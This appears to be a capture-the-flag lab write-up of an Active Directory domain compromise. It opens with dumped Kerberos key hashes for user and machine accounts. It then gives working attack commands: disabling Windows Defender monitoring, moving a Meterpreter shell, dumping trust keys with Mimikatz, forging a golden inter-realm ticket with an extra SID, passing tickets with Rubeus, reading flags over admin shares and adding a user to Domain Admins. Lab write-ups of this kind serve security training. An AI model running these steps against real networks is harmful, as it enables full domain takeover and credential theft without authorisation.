internal.zsm.local\Jamie:aes256-cts-hmac-sha1-96:899a0a57d770ad6510608350b67487beb5c50ac8f3455a1804ff4e8eb85da5e8
internal.zsm.local\Jamie:aes128-cts-hmac-sha1-96:abc87732e5844aafab3c8b355076a959
internal.zsm.local\Jamie:des-cbc-md5:5234a7253bd31f98
ZPH-SVRCDC01$:aes256-cts-hmac-sha1-96:8a67907987149e76179c1717526a984b286656ce9c5afae114b11a0e1187d282
ZPH-SVRCDC01$:aes128-cts-hmac-sha1-96:68e66ddb5aaf1e796af831a3a0527699
ZPH-SVRCDC01$:des-cbc-md5:298c2fb6f823790d
ZPH-SVRCHR$:aes256-cts-hmac-sha1-96:9b37dffd2f9e191262978b8a9cc9b41f782165e4f4709973c9e1e5ada5f80e35
ZPH-SVRCHR$:aes128-cts-hmac-sha1-96:cf8f357935397b6fcf7058e751ffd9e6
ZPH-SVRCHR$:des-cbc-md5:4698c19bbaf8b667
ZPH-SVRCSUP$:aes256-cts-hmac-sha1-96:980035e13beb4c1b68e5071f0b919bf1a11b37cf3573e0a88f0305614fb361d3
ZPH-SVRCSUP$:aes128-cts-hmac-sha1-96:a98bbab60af92f6b8ce9d1f93e9a230c
ZPH-SVRCSUP$:des-cbc-md5:ec7acd5d73fb371f
ZSM-SVRCSQL02$:aes256-cts-hmac-sha1-96:1270026132348b974c1a948cd7b202ae9678b5b3b03cdbdb4be825c1c11f4d71
ZSM-SVRCSQL02$:aes128-cts-hmac-sha1-96:5d3e1581bca6b36aac111bb16bc8e2e1
ZSM-SVRCSQL02$:des-cbc-md5:bf8faba8893475a7
INT-MAINT$:aes256-cts-hmac-sha1-96:7c6282803848f411d9f819642f917bd14a023f3fb66d803868e04faa00c1c859
INT-MAINT$:aes128-cts-hmac-sha1-96:34cc456699aa20c6a3d00433fa959455
INT-MAINT$:des-cbc-md5:aebc7f4368a29885
ZSM$:aes256-cts-hmac-sha1-96:06e8d91517514eaff99fd5f6c4e63408d3447bc858ba106efdeb4a841c10bf70
ZSM$:aes128-cts-hmac-sha1-96:ca33a5eefa62d5244f59ba1ed150f7e5
ZSM$:des-cbc-md5:75cb758f2c570ba1
[*] Cleaning up... 

```

# Ownage

```
set-mppreference -disablerealtimemonitoring $true
```

Move the Meterprete shell over. 

## Mimikatz
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::trust /patch
```

### Child Domain SID
```
S-1-5-21-3056178012-3972705859-491075245
```

### Mimikatz Golden Ticket
```
Kerberos::golden /user:administrator /domain:internal.zsm.local /sid:S-1-5-21-3056178012-3972705859-491075245 /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:3b27177e3a7db14398cbbd9bbb7ba315 /service:krbtgt /target:zsm.local /ticket:trustkey.kirbi
```

### Rubeus PTT
```
.\Rubeus.exe asktgs /ticket:trustkey.kirbi /service:CIFS/ZPH-SVRDC01.zsm.local /dc:ZPH-SVRDC01.zsm.local /ptt
```

```
C:\users\administrator\documents\p3ta>klist
klist

Current LogonId is 0:0x1119776d

Cached Tickets: (1)

#0>	Client: p3ta @ internal.zsm.local
	Server: CIFS/ZPH-SVRDC01.zsm.local @ ZSM.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize 
	Start Time: 11/22/2023 19:53:16 (local)
	End Time:   11/23/2023 5:53:16 (local)
	Renew Time: 11/29/2023 19:53:16 (local)
	Session Key Type: AES-256-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called: 

C:\users\administrator\documents\p3ta>type \\ZPH-SVRDC01.zsm.local\C$\users\administrator\desktop\flag.txt
type \\ZPH-SVRDC01.zsm.local\C$\users\administrator\desktop\flag.txt
ZEPHYR{34t1ng_7h3_B0n3s_0f_N3tw0rks}
C:\users\administrator\documents\p3ta>

```

```
.\Rubeus.exe asktgs /ticket:trustkey.kirbi /service:CIFS/ZPH-SVRDC01.zsm.local /dc:ZPH-SVRDC01.zsm.local /ptt
```

```
.\Rubeus.exe asktgs /ticket:trustkey.kirbi /service:HTTP/ZPH-SVRDC01.zsm.local /dc:ZPH-SVRDC01.zsm.local /ptt
```

```
type \\ZPH-SVRADFS1\C$\users\administrator\desktop\flag.txt

```

Add-ADGroupMember -Identity "Domain Admins" -Members "p3ta"
```
type \\192.168.210.14\C$\users\administrator\desktop\flag.txt
```